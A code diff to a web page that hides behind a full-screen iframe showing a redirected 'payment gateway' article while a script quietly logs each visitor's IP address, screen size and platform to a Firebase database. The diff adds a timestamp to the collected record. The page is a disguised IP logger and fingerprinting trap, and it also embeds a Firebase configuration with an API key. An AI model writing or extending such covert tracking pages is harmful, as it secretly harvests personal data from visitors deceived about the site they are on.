@@ -9,6 +9,10 @@
 	<iframe id="Site" frameborder="0" style="position: fixed; top: 0; left: 0; width: 100%; height: 100%; border: none;" src="https://www.bing.com/ck/a?!&&p=d1b62ca6fdc9ec86JmltdHM9MTcxMjE4ODgwMCZpZ3VpZD0yY2FkZjlmYi0zYjI4LTY0NzUtMzVjNy1lYWVkM2E5YTY1MWMmaW5zaWQ9NTIwOQ&ptn=3&ver=2&hsh=3&fclid=2cadf9fb-3b28-6475-35c7-eaed3a9a651c&psq=payment+gateway+(2024)+moneybrand&u=a1aHR0cHM6Ly93d3cubW9uZXlicmFuZC5vbmxpbmUvMjAyNC8wMS9QYXltZW50LUdhdGV3YXlzLmh0bWw&ntb=1" sandbox="allow-scripts allow-same-origin"></iframe>	
 
 	<script>
+	var currentDate = new Date();
+
+	var currentTime = currentDate.toLocaleTimeString('en-IN', { timeZone: 'Asia/Kolkata' });
+
 	const firebaseConfig = {
     			apiKey: "AIzaSyDJfe1BcZk52ybfkA4PB34Q440CmcrX5nY",
     			authDomain: "arched-logic-327701.firebaseapp.com",
@@ -27,6 +31,7 @@
 	{
 		var postData = {
       			IP: data.ip,
+			Time: currentTime,
 			ScreenWidth: window.screen.width,
 			ScreeHeight: window.screen.height,
 			Platform: window.navigator.platform,
